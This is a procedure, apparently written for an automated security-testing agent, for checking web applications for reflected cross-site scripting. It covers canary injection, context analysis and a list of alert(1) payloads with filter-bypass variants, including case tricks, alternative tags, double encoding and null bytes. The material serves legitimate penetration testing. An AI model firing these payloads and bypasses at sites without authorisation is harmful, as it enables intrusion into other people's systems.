# Check Reflected XSS

## Objective
Test whether user-controlled input is reflected in the response without proper encoding, enabling cross-site scripting.

## Procedure

### Step 1: Identify reflection points
Use `get_traffic` and `get_request_details` to find the target's parameters. Identify all user-controlled input that could appear in the response:
- URL query parameters (e.g., `?search=TERM`, `?q=TERM`, `?name=VALUE`)
- Form fields (POST body parameters)
- URL path segments (e.g., `/user/NAME/profile`)
- HTTP headers reflected in error pages (Referer, User-Agent)

### Step 2: Reflection canary
For each parameter, inject a unique non-malicious canary string (e.g., `hb7xss9test`) via `execute_request` and check if it appears verbatim in the response body. This confirms the parameter's value is reflected.

If the canary does not appear: the parameter is not reflected — skip it.

### Step 3: Context analysis
For each reflected parameter, determine the reflection context by examining the HTML around the canary:

**HTML body context:** `<p>Your search: hb7xss9test</p>`
- Test: `<img src=x onerror=alert(1)>`
- Encoding needed to block: `<` and `>` must be HTML-encoded

**HTML attribute context:** `<input value="hb7xss9test">`
- Test: `" onfocus=alert(1) autofocus="`
- Encoding needed: `"` must be HTML-encoded

**JavaScript context:** `var x = "hb7xss9test";`
- Test: `";alert(1)//`
- Encoding needed: `"`, `\`, and `;` must be escaped

**URL context:** `<a href="https://target.com/redirect?url=hb7xss9test">`
- Test: `javascript:alert(1)`
- Encoding needed: `javascript:` protocol must be blocked

### Step 4: Payload testing
Based on the context, craft specific payloads using `execute_request`:

**Basic payloads (try first):**
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `"><script>alert(1)</script>`

**If basic payloads are filtered, try bypasses:**
- Case variation: `<ScRiPt>alert(1)</ScRiPt>`
- Tag alternatives: `<details open ontoggle=alert(1)>`, `<marquee onstart=alert(1)>`
- Encoding: `%3Csvg%20onload%3Dalert(1)%3E`
- Double encoding: `%253Csvg%2520onload%253Dalert(1)%253E`
- Null bytes: `<scr%00ipt>alert(1)</script>`
- Attribute context escapes: `' onfocus='alert(1)` (for single-quoted attributes)

### Step 5: Filter analysis
If payloads are being sanitized:
1. Determine what's being filtered: specific tags? Event handlers? Angle brackets? Quotes?
2. Try payloads that avoid filtered patterns
3. Test if the filter is applied consistently on all parameters or just some
4. Check if POST parameters have different filtering than GET parameters

## Expected outcomes
- **found**: Parameter reflects input without encoding, allowing script execution (include exact payload and response showing execution context)
- **not_found**: All reflected input is properly encoded or sanitized for its context
- **partial**: Reflection exists but WAF or server-side filter blocks all tested payloads (filter may be bypassable with more research)
- **variant**: Input is reflected and partially encoded but in a context where encoding is insufficient (e.g., JavaScript string context with only HTML encoding)

## Output
- Each tested parameter and its reflection context
- Successful payload (if found) with exact request/response evidence
- Filter behavior observed (what was blocked, what was passed)
- Request IDs from traffic for evidence
